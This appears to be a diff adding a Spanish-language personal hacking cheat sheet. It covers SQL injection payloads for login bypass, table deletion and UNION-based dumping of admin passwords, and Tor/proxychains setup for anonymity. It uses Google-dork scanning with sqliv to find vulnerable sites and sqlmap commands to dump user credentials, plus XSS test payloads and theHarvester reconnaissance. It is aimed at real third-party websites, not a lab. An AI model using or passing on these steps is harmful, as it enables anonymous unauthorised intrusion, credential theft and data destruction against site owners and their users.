@@ -1,0 +1,66 @@
+------------------------------------------------------
+////////////////////////////////////////////////////////////////////////////////////////////
+////// SQL INJECTION  /////////////////
+//////////////////////////////////////////////////////////////////////////////////////
+
+'            //si tecleamos esta coma simple en la url de una pagina web y nos sale en la pagina un error es porque es vulnerable
+'or'1'='1    // Esta sentencia se pone en el login de una BD y puede abrir la BD
+'or 1=1--    //TAMBIEN HAY UNAS PAGINAS QUE RECIBEN LA SENTENCIA SIN LA COMILLA INICIAL
+and 1=1
+Admin '--  //Con esta sentencia en el espacio de usuario intentamos entrar como admin
+'or 1=1--  //esta sentencia va en el espacio de contrase�a
+'or          //solo con el or podemos verificar el nombre de una tabla
+';DROP TABLE NOMBREDETABLA   // con esta linea podemos borrar la tabla NOMBREDETABLA aprovechando la vulnerabilidad  
+
+///////////////
+
+order by 15--  // Esta sentencia se pone en el link de la pagina y puede cambiar el numero 
+union all select 1,2,3, 15-- //se ponen los numeros hasta que llegue al valor donde siga mostrando contenido, 
+                             //en pantalla aparece un numero en donde hay vulnerabilidad de sqlinjection
+union all select 1,2,@@version, 15--   //luego de saber donde esta la vuln se pone el @@version para ver la version
+union all select 1,2,group_concat(table_name),9,10,15 from information_schema.tables where table_schema=database()--
+                              //la sentencia anterior es para saber los nombres de las tablas que acompa�an a "information_schema.tables"
+union all select 1,2,group_concat(column_name),9,10,15 from information_schema.columns where table_schema=database()--
+                              //la sentencia anterior es para saber los nombres de las columnas que acompa�an a "information_schema.tables"
+union all select 1,2,group_concat(ru_Admin_Username,0x3a,ru_Admin_Password),9,10,15 from ru_Admin
+                              //la sentencia anterior es paa ver la contrase�a del usuario admin
+///////////////////
+sudo su    //para quedar como super usuario de kalilinux
+setxkbmap es sundeadkeys   //poner el teclado en espa�ol
+sudo apt-get update
+sudo apt install net-tools
+nslookup paginaweb.com     //Con este codigo en la consola de kali linux podemos ver la ip publica de una pagina
+
+
+sudo apt-get install tor  //para instalar tor en kalilinux para mejorar el anonimate
+sudo nano /etc/proxychains.conf   // ese "/etc/proxychains.conf" es la localizacion del archivo proxy y el loalpad es para editarlo
+dynamic_chain  //se le quita el comentario a dynamic
+#strict_chain   //se le pone comentario
+socks5 127.0.0.1 9050   // este codigo lo ponemos al final del programa luego de los comentarios con 
+sudo service tor start // esto se pone en la consola de kalilinux para mantener el anonimato igualmente el proxychain es para el anonimato
+sudo service tor status
+sudo service tor restart
+proxychains firefox http://www.cualesmiip.com/   //antes de abrir cada pagina hay que poner el proxichains 
+
+proxychains sqliv -d "inurl:index.php?id=" -e google  //En la consola de kalilinux con este codigo buscamos las bd con esa vulnerabilidad
+                                                      //o lo podemos buscar en un navegador como "inurl:index.php?id="
+                                                       //cuando encontremos una pagina con esta vulnerabilidad podemos ponerle una comilla simple en la URL para confirmar
+
+proxychains sqlmap -u http://www.paginaweb.com/basededatos --dbs  //este comando en kalilinux sirve para ver las bd en esa pagina web
+proxychains sqlmap -u http://www.paginaweb.com/basededatos -D nombre_bd --tables //cuando ya tenemos el nombre de la bd con este comando vemos sus tablas
+proxychains sqlmap -u http://www.paginaweb.com/basededatos -D nombre_bd -T usuario --columns // es para ver las columnas dentro de la tabla usuario
+proxychains sqlmap -u http://www.paginaweb.com/basededatos -D nombre_bd -T usuario -C usuario,contrase�a --dump //Es para ver los datos que estan en usuario y contrase�a
+ 
+https://www.hackers.tools/2016/02/lista-de-paginas-vulnerables-inyeccion.html  //paginas que tienen vulnerabilidades
+
+/////////// XSS
+
+<script>alert();</script>      //esto se puede poner en el usuario de una pagina y generar una pantalla de alerta
+><script>alert('x');</script><   //si el primero no funciona quizas funcione este
+
+https://www.youtube.com/watch?v=EHmDkTb2hW0     //Eyes of Network 5.1
+
+//////////THEHARVESTER
+subdominios, correos electronicos, puertos abiertos
+theHarvester -d dominio -l 50
+shodan.io
